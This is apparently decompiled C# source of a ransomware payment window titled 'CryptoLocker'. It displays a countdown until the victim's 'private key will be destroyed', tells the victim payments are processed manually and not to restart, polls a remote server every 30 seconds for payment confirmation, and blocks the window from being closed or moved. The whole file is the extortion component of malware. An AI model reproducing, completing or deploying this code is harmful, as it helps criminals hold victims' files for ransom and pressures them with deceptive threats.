using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace Final;

public class Form3 : Form
{
	private GClass0 gclass0_0 = new GClass0();

	private string string_0;

	private Thread thread_0;

	private Timer timer_0 = new Timer();

	private IContainer icontainer_0;

	private PictureBox pictureBox1;

	private Label label2;

	private Label label3;

	private Label label5;

	private Label label6;

	private Label label7;

	private Label label8;

	private Label label9;

	private Label label10;

	private Button button1;

	private Timer timer_1;

	private Label label11;

	private Label label12;

	private Label label13;

	private Label label14;

	private Label label16;

	private Label label1;

	private Panel panel1;

	private Label label4;

	private Label label15;

	private ProgressBar progressBar1;

	private Label label26;

	private Label label25;

	private Label label17;

	private Label label18;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ClassStyle(createParams.get_ClassStyle() | 0x200);
			return createParams;
		}
	}

	public Form3()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		InitializeComponent();
	}

	protected override void WndProc(ref Message m)
	{
		if ((((Message)(ref m)).get_Msg() != 274 || ((Message)(ref m)).get_WParam().ToInt32() != 61456) && (((Message)(ref m)).get_Msg() != 161 || ((Message)(ref m)).get_WParam().ToInt32() != 2))
		{
			((Form)this).WndProc(ref m);
		}
	}

	private void method_0()
	{
		((Control)button1).set_Enabled(false);
		((Control)label17).Hide();
	}

	private void method_1()
	{
		((Control)progressBar1).Hide();
		((Control)button1).set_Enabled(true);
		((Control)label17).Show();
	}

	private void method_2()
	{
		bool flag = false;
		while (!flag)
		{
			if (gclass0_0.method_2(string_0, 3))
			{
				flag = true;
				method_1();
			}
			Thread.Sleep(30000);
		}
	}

	private void Form3_Load(object sender, EventArgs e)
	{
		string_0 = "http://" + gclass0_0.method_4() + "/";
		gclass0_0.method_15(string_0);
		gclass0_0.dateTime_0 = DateTime.Now.AddSeconds(gclass0_0.int_0);
		timer_0.set_Interval(1000);
		timer_0.add_Tick((EventHandler)timer_0_Tick);
		timer_0.Start();
		((Control)label3).set_Text(gclass0_0.dateTime_0.ToString());
		progressBar1.set_MarqueeAnimationSpeed(30);
		method_0();
		thread_0 = new Thread((ThreadStart)delegate
		{
			method_2();
		});
		thread_0.Start();
	}

	private void timer_0_Tick(object sender, EventArgs e)
	{
		gclass0_0.int_0--;
		TimeSpan timeSpan = TimeSpan.FromSeconds(gclass0_0.int_0);
		if (gclass0_0.int_0 < 0)
		{
			timer_0.Stop();
			return;
		}
		((Control)label25).set_Text(timeSpan.Days.ToString());
		((Control)label6).set_Text(timeSpan.Hours.ToString());
		((Control)label8).set_Text(timeSpan.Minutes.ToString());
		((Control)label10).set_Text(timeSpan.Seconds.ToString());
	}

	private void button1_Click(object sender, EventArgs e)
	{
		((Control)button1).set_Enabled(false);
		Form4 form = new Form4();
		((Control)form).Show();
		((Control)this).Hide();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_010e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Expected O, but got Unknown
		//IL_0151: Unknown result type (might be due to invalid IL or missing references)
		//IL_015b: Expected O, but got Unknown
		//IL_01d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01da: Expected O, but got Unknown
		//IL_0263: Unknown result type (might be due to invalid IL or missing references)
		//IL_026d: Expected O, but got Unknown
		//IL_02f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_02fd: Expected O, but got Unknown
		//IL_0383: Unknown result type (might be due to invalid IL or missing references)
		//IL_038d: Expected O, but got Unknown
		//IL_0413: Unknown result type (might be due to invalid IL or missing references)
		//IL_041d: Expected O, but got Unknown
		//IL_04a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_04b0: Expected O, but got Unknown
		//IL_053a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0544: Expected O, but got Unknown
		//IL_05ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_05d8: Expected O, but got Unknown
		//IL_0683: Unknown result type (might be due to invalid IL or missing references)
		//IL_068d: Expected O, but got Unknown
		//IL_074d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0757: Expected O, but got Unknown
		//IL_07cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_07d7: Expected O, but got Unknown
		//IL_0850: Unknown result type (might be due to invalid IL or missing references)
		//IL_085a: Expected O, but got Unknown
		//IL_08d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_08dd: Expected O, but got Unknown
		//IL_0956: Unknown result type (might be due to invalid IL or missing references)
		//IL_0960: Expected O, but got Unknown
		//IL_09c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_09d3: Expected O, but got Unknown
		//IL_0b28: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b32: Expected O, but got Unknown
		//IL_0bc7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bd1: Expected O, but got Unknown
		//IL_0cac: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cb6: Expected O, but got Unknown
		//IL_0d38: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d42: Expected O, but got Unknown
		//IL_0dc4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dce: Expected O, but got Unknown
		//IL_0e55: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e5f: Expected O, but got Unknown
		//IL_1064: Unknown result type (might be due to invalid IL or missing references)
		//IL_106e: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form3));
		pictureBox1 = new PictureBox();
		label2 = new Label();
		label3 = new Label();
		label5 = new Label();
		label6 = new Label();
		label7 = new Label();
		label8 = new Label();
		label9 = new Label();
		label10 = new Label();
		button1 = new Button();
		label11 = new Label();
		label12 = new Label();
		label13 = new Label();
		label14 = new Label();
		label16 = new Label();
		label1 = new Label();
		panel1 = new Panel();
		label18 = new Label();
		label17 = new Label();
		progressBar1 = new ProgressBar();
		label15 = new Label();
		label4 = new Label();
		label26 = new Label();
		label25 = new Label();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)panel1).SuspendLayout();
		((Control)this).SuspendLayout();
		pictureBox1.set_ErrorImage((Image)null);
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(12, 57));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(255, 258));
		pictureBox1.set_TabIndex(2);
		pictureBox1.set_TabStop(false);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Arial", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.White);
		((Control)label2).set_Location(new Point(66, 318));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(161, 14));
		((Control)label2).set_TabIndex(3);
		((Control)label2).set_Text("Private key will be destroyed on");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Arial", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(Color.White);
		((Control)label3).set_Location(new Point(84, 334));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(126, 14));
		((Control)label3).set_TabIndex(4);
		((Control)label3).set_Text("12/13/2013 00:00:00 PM");
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font("Arial", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_ForeColor(Color.White);
		((Control)label5).set_Location(new Point(120, 384));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(47, 14));
		((Control)label5).set_TabIndex(6);
		((Control)label5).set_Text("Time left");
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Font(new Font("Arial", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label6).set_ForeColor(Color.Yellow);
		((Control)label6).set_Location(new Point(110, 400));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(34, 24));
		((Control)label6).set_TabIndex(7);
		((Control)label6).set_Text("00");
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_Font(new Font("Arial", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label7).set_ForeColor(Color.Yellow);
		((Control)label7).set_Location(new Point(140, 400));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(17, 24));
		((Control)label7).set_TabIndex(8);
		((Control)label7).set_Text(":");
		((Control)label8).set_AutoSize(true);
		((Control)label8).set_Font(new Font("Arial", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label8).set_ForeColor(Color.Yellow);
		((Control)label8).set_Location(new Point(155, 400));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(34, 24));
		((Control)label8).set_TabIndex(9);
		((Control)label8).set_Text("00");
		((Control)label9).set_AutoSize(true);
		((Control)label9).set_Font(new Font("Arial", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label9).set_ForeColor(Color.Yellow);
		((Control)label9).set_Location(new Point(185, 400));
		((Control)label9).set_Name("label9");
		((Control)label9).set_Size(new Size(17, 24));
		((Control)label9).set_TabIndex(10);
		((Control)label9).set_Text(":");
		((Control)label10).set_AutoSize(true);
		((Control)label10).set_Font(new Font("Arial", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label10).set_ForeColor(Color.Yellow);
		((Control)label10).set_Location(new Point(198, 400));
		((Control)label10).set_Name("label10");
		((Control)label10).set_Size(new Size(34, 24));
		((Control)label10).set_TabIndex(11);
		((Control)label10).set_Text("00");
		((Control)button1).set_BackColor(Color.RoyalBlue);
		((ButtonBase)button1).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)button1).set_FlatStyle((FlatStyle)0);
		((Control)button1).set_Font(new Font("Arial", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)button1).set_ForeColor(Color.White);
		((Control)button1).set_Location(new Point(566, 520));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(140, 39));
		((Control)button1).set_TabIndex(13);
		((Control)button1).set_Text("Next >>");
		((ButtonBase)button1).set_UseVisualStyleBackColor(false);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)label11).set_AutoSize(true);
		((Control)label11).set_BackColor(Color.White);
		((Control)label11).set_Font(new Font("Arial", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label11).set_Location(new Point(364, 105));
		((Control)label11).set_Name("label11");
		((Control)label11).set_Size(new Size(0, 19));
		((Control)label11).set_TabIndex(22);
		((Control)label12).set_AutoSize(true);
		((Control)label12).set_BackColor(Color.White);
		((Control)label12).set_Font(new Font("Arial", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label12).set_Location(new Point(344, 135));
		((Control)label12).set_Name("label12");
		((Control)label12).set_Size(new Size(0, 19));
		((Control)label12).set_TabIndex(23);
		((Control)label13).set_AutoSize(true);
		((Control)label13).set_BackColor(Color.White);
		((Control)label13).set_Font(new Font("Arial", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label13).set_Location(new Point(305, 164));
		((Control)label13).set_Name("label13");
		((Control)label13).set_Size(new Size(0, 19));
		((Control)label13).set_TabIndex(24);
		((Control)label14).set_AutoSize(true);
		((Control)label14).set_BackColor(Color.White);
		((Control)label14).set_Font(new Font("Arial", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label14).set_Location(new Point(341, 192));
		((Control)label14).set_Name("label14");
		((Control)label14).set_Size(new Size(0, 19));
		((Control)label14).set_TabIndex(25);
		((Control)label16).set_AutoSize(true);
		((Control)label16).set_BackColor(Color.White);
		((Control)label16).set_Font(new Font("Arial", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label16).set_Location(new Point(321, 251));
		((Control)label16).set_Name("label16");
		((Control)label16).set_Size(new Size(0, 19));
		((Control)label16).set_TabIndex(27);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Arial", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.White);
		((Control)label1).set_Location(new Point(336, 25));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(317, 24));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Waiting for payment activation");
		((Control)panel1).set_BackColor(Color.White);
		((Control)panel1).get_Controls().Add((Control)(object)label18);
		((Control)panel1).get_Controls().Add((Control)(object)label17);
		((Control)panel1).get_Controls().Add((Control)(object)progressBar1);
		((Control)panel1).get_Controls().Add((Control)(object)label15);
		((Control)panel1).get_Controls().Add((Control)(object)label4);
		((Control)panel1).set_Location(new Point(274, 57));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(432, 450));
		((Control)panel1).set_TabIndex(29);
		((Control)label18).set_AutoSize(true);
		((Control)label18).set_Font(new Font("Arial", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label18).set_ForeColor(Color.Maroon);
		((Control)label18).set_Location(new Point(43, 325));
		((Control)label18).set_Name("label18");
		((Control)label18).set_Size(new Size(349, 22));
		((Control)label18).set_TabIndex(4);
		((Control)label18).set_Text("Please do not restart your computer!");
		label18.set_TextAlign((ContentAlignment)2);
		((Control)label17).set_AutoSize(true);
		((Control)label17).set_Font(new Font("Arial", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label17).set_Location(new Point(26, 213));
		((Control)label17).set_Name("label17");
		((Control)label17).set_Size(new Size(291, 16));
		((Control)label17).set_TabIndex(3);
		((Control)label17).set_Text("Payment was received. Please Click Next >>");
		label17.set_TextAlign((ContentAlignment)2);
		((Control)progressBar1).set_Location(new Point(29, 168));
		((Control)progressBar1).set_Name("progressBar1");
		((Control)progressBar1).set_Size(new Size(377, 23));
		progressBar1.set_Style((ProgressBarStyle)2);
		((Control)progressBar1).set_TabIndex(2);
		((Control)label15).set_AutoSize(true);
		((Control)label15).set_Font(new Font("Arial", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label15).set_Location(new Point(26, 48));
		((Control)label15).set_Name("label15");
		((Control)label15).set_Size(new Size(380, 14));
		((Control)label15).set_TabIndex(1);
		((Control)label15).set_Text("The private key destruction is suspended for the time of payment processing.");
		label15.set_TextAlign((ContentAlignment)2);
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Arial", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_Location(new Point(26, 11));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(388, 28));
		((Control)label4).set_TabIndex(0);
		((Control)label4).set_Text("Payments are processed manually, therefore, the expectation of activation may\r\ntake up to 48 hours.");
		label4.set_TextAlign((ContentAlignment)2);
		((Control)label26).set_AutoSize(true);
		((Control)label26).set_Font(new Font("Arial", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label26).set_ForeColor(Color.Yellow);
		((Control)label26).set_Location(new Point(84, 400));
		((Control)label26).set_Name("label26");
		((Control)label26).set_Size(new Size(29, 24));
		((Control)label26).set_TabIndex(35);
		((Control)label26).set_Text("d.");
		((Control)label25).set_AutoSize(true);
		((Control)label25).set_Font(new Font("Arial", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label25).set_ForeColor(Color.Yellow);
		((Control)label25).set_Location(new Point(54, 400));
		((Control)label25).set_Name("label25");
		((Control)label25).set_Size(new Size(34, 24));
		((Control)label25).set_TabIndex(34);
		((Control)label25).set_Text("00");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Maroon);
		((Form)this).set_ClientSize(new Size(721, 573));
		((Control)this).get_Controls().Add((Control)(object)label26);
		((Control)this).get_Controls().Add((Control)(object)label25);
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Control)this).get_Controls().Add((Control)(object)label16);
		((Control)this).get_Controls().Add((Control)(object)label14);
		((Control)this).get_Controls().Add((Control)(object)label13);
		((Control)this).get_Controls().Add((Control)(object)label12);
		((Control)this).get_Controls().Add((Control)(object)label11);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label10);
		((Control)this).get_Controls().Add((Control)(object)label9);
		((Control)this).get_Controls().Add((Control)(object)label8);
		((Control)this).get_Controls().Add((Control)(object)label7);
		((Control)this).get_Controls().Add((Control)(object)label6);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).set_Cursor(Cursors.get_Default());
		((Form)this).set_FormBorderStyle((FormBorderStyle)2);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form3");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("CryptoLocker");
		((Form)this).add_Load((EventHandler)Form3_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)panel1).ResumeLayout(false);
		((Control)panel1).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[CompilerGenerated]
	private void method_3()
	{
		method_2();
	}
}
